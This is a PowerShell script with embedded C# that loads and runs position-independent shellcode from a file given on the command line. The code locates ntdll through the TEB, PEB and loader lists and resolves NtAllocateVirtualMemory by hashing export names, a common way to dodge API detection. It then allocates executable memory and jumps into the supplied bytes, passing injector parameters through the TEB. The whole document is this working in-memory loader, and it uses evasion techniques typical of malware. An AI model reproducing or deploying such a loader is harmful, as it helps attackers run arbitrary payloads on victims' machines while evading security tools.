param(
    [Parameter(Mandatory = $true, Position = 0)]
    [string] $FilePath
)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class PICLoader
{
    private static bool IsArm64()
    {
        string arch = System.Environment.GetEnvironmentVariable(`"PROCESSOR_ARCHITECTURE`");
        return arch != null && arch.Equals(`"ARM64`", StringComparison.OrdinalIgnoreCase);
    }

    public static void Load(byte[] bytes)
    {

        byte[] asm;
        if (IsArm64())
        {
            // ARM64 Windows: mov x0, x18; ret (x18 is TEB pointer on Windows ARM64)
            asm = new byte[] { 0xE0, 0x03, 0x12, 0xAA, 0xC0, 0x03, 0x5F, 0xD6 };
        }
        else if (IntPtr.Size == 8)
        {
            // x64: mov rax, qword ptr gs:[0x30]; ret
            asm = new byte[] { 0x65, 0x48, 0xA1, 0x30, 0, 0, 0, 0, 0, 0, 0, 0xC3 };
        }
        else
        {
            // x86: mov eax, dword ptr fs:[0x18]; ret
            asm = new byte[] { 0x64, 0xA1, 0x18, 0, 0, 0, 0xC3 };
        }

        IntPtr ptr = Marshal.AllocHGlobal(asm.Length);

        Marshal.Copy(asm, 0, ptr, asm.Length);
        uint oldProtect;
        ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, 0x40, out oldProtect);

        GetTEBDelegate getTEBDelegate = (GetTEBDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetTEBDelegate));

        IntPtr tebAddress = getTEBDelegate();

        ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, oldProtect, out oldProtect);
        Marshal.FreeHGlobal(ptr);

        bool isArm64 = IsArm64();

        // TEB.ProcessEnvironmentBlock offset differs by architecture
        int pebOffset = isArm64 ? 0x60 : (IntPtr.Size == 8 ? 0x60 : 0x30);
        IntPtr pebAddress = Marshal.ReadIntPtr(IntPtrAdd(tebAddress, pebOffset));

        // PEB.Ldr offset
        int ldrOffset = isArm64 ? 0x18 : (IntPtr.Size == 8 ? 0x18 : 0x0C);
        IntPtr loaderDataAddress = Marshal.ReadIntPtr(IntPtrAdd(pebAddress, ldrOffset));

        // PEB_LDR_DATA.InMemoryOrderModuleList offset
        int inMemoryOrderOffset = isArm64 ? 0x20 : (IntPtr.Size == 8 ? 0x20 : 0x14);
        IntPtr inMemoryOrderModuleList = IntPtrAdd(loaderDataAddress, inMemoryOrderOffset);

        IntPtr firstEntry = Marshal.ReadIntPtr(inMemoryOrderModuleList);
        IntPtr secondEntry = Marshal.ReadIntPtr(firstEntry);

        // LDR_DATA_TABLE_ENTRY.DllBase offset
        int dllBaseOffset = isArm64 ? 32 : (IntPtr.Size == 8 ? 32 : 16);
        IntPtr ntdllHandle = Marshal.ReadIntPtr(IntPtrAdd(secondEntry, dllBaseOffset));
        IntPtr ntAllocateVirtualMemoryPtr = GetProcAddressByHash(ntdllHandle, 3580609816);

        NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntAllocateVirtualMemoryPtr, typeof(NtAllocateVirtualMemory));

        IntPtr pMemory = IntPtr.Zero;
        UIntPtr regionSize = (UIntPtr)bytes.Length;

        int status = ntAllocateVirtualMemory(
            new IntPtr(-1),
            ref pMemory,
            IntPtr.Zero,
            ref regionSize,
            0x1000 | 0x2000,
            0x40
        );
        Marshal.Copy(bytes, 0, pMemory, bytes.Length);

        IntPtr parametersMemory = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Parameters)));
        Parameters parameters = new Parameters
        {
            InjectorVersion = uint.MaxValue,
            InjectorCompilationType = 100
        };
        Marshal.StructureToPtr(parameters, parametersMemory, false);

        // TEB.ArbitraryUserPointer offset
        int arbUserPtrOffset = isArm64 ? 0x50 : (IntPtr.Size == 8 ? 0x50 : 0x28);
        Marshal.WriteIntPtr(tebAddress, arbUserPtrOffset, parametersMemory);

        entry_t entry = (entry_t)Marshal.GetDelegateForFunctionPointer(pMemory, typeof(entry_t));
        int result = entry(uint.MaxValue);

        Marshal.FreeHGlobal(parametersMemory);
    }
    static IntPtr IntPtrAdd(IntPtr p0, int p1)
    {
        return new IntPtr((IntPtr.Size == 8 ? p0.ToInt64() : p0.ToInt32()) + p1);
    }

    static IntPtr GetProcAddressByHash(IntPtr hModule, uint eHash)
    {
        // Read IMAGE_DOS_HEADER->e_lfanew (Offset: 0x3C)
        int e_lfanew = Marshal.ReadInt32(IntPtrAdd(hModule, 0x3C));

        // IMAGE_NT_HEADERS starts at e_lfanew
        int optionalHeaderOffset = e_lfanew + (IntPtr.Size == 8 ? 0x88 : 0x78); // Adjust OptionalHeader size for 64-bit

        // Read IMAGE_NT_HEADERS->OptionalHeader->ExportTable RVA
        int exportTableRVA = Marshal.ReadInt32(IntPtrAdd(hModule, optionalHeaderOffset));

        // Calculate the absolute address of the Export Table
        IntPtr exportTable = IntPtrAdd(hModule, exportTableRVA);

        // Read IMAGE_EXPORT_DIRECTORY fields
        int numberOfNames = Marshal.ReadInt32(IntPtrAdd(exportTable, 0x18)); // Offset of NumberOfNames
        int addressOfFunctions = Marshal.ReadInt32(IntPtrAdd(exportTable, 0x1C)); // RVA of AddressOfFunctions
        int addressOfNames = Marshal.ReadInt32(IntPtrAdd(exportTable, 0x20)); // RVA of AddressOfNames
        int addressOfNameOrdinals = Marshal.ReadInt32(IntPtrAdd(exportTable, 0x24)); // RVA of AddressOfNameOrdinals

        // Adjust RVAs to absolute addresses
        IntPtr namesPtr = IntPtrAdd(hModule, addressOfNames);
        IntPtr ordinalsPtr = IntPtrAdd(hModule, addressOfNameOrdinals);
        IntPtr functionsPtr = IntPtrAdd(hModule, addressOfFunctions);

        // Iterate through exported function names
        for (int i = 0; i < numberOfNames; i++)
        {
            uint cHash = 77777;

            // Get the function name RVA from AddressOfNames array
            IntPtr nameRVA = IntPtrAdd(namesPtr, i * 4);
            IntPtr namePtr = IntPtrAdd(hModule, Marshal.ReadInt32(nameRVA));
            string functionName = Marshal.PtrToStringAnsi(namePtr);

            // Calculate hash
            for (int j = 0; j < functionName.Length; j++)
            {
                char c = functionName[j];
                if (c >= 65 && c <= 90) c += (char)32;  // Convert to lowercase
                cHash = ((cHash << 5) + cHash) + c;
            }

            // Compare hashes
            if (cHash == eHash)
            {
                // Get the ordinal value from AddressOfNameOrdinals
                IntPtr ordinalPtr = IntPtrAdd(ordinalsPtr, i * 2); // Ordinals are 2 bytes
                ushort ordinal = (ushort)Marshal.ReadInt16(ordinalPtr);

                // Get the function address from AddressOfFunctions
                IntPtr functionRVA = IntPtrAdd(functionsPtr, ordinal * 4);
                uint functionOffset = (uint)Marshal.ReadInt32(functionRVA);
                return IntPtrAdd(hModule, (int)functionOffset); // Return final address of the function
            }
        }

        return IntPtr.Zero; // Return zero if not found

    }
    [StructLayout(LayoutKind.Sequential)]
    struct Parameters
    {
        public uint InjectorVersion;
        public uint InjectorCompilationType;
        public IntPtr DllPath;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr GetTEBDelegate();
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref UIntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );
        [DllImport("kernel32.dll", EntryPoint = "VirtualProtect", SetLastError = true)]
    static extern bool ChangeMemoryProtection(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int entry_t(ulong injectorVersion);
    }
"@



# Validate + normalize path
$fullPath = (Resolve-Path -LiteralPath $FilePath).Path
if (-not (Test-Path -LiteralPath $fullPath -PathType Leaf)) {
    throw "File not found: $fullPath"
}

# Read file bytes
[byte[]] $bytes = [System.IO.File]::ReadAllBytes($fullPath)
Write-Host "Loading PIC from: $fullPath"

[PICLoader]::Load($bytes)